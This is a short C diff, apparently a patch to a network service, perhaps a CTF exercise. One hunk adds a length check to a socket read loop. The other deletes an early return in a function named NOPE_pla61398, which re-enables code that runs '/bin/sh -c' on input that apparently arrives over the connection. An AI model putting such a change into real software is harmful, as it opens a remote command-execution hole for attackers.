@@ -51,7 +51,7 @@ void add_command(int conn) {
 	do {
 		i++;
 		read(conn, &cmd[i], 1);
-	} while (cmd[i] != '\n');
+	} while (cmd[i] != '\n' && i < 127);
 	cmd[i] = '\0';
 
 	if (script_cmds == NULL) {
@@ -217,8 +217,6 @@ void NOPE_pla61398(int conn) {
 	char cmd[256];
 	char *args[4];
 	int i = -1;
-
-	return;
 
 	args[0] = strdup("/bin/sh");
 	args[1] = strdup("-c");
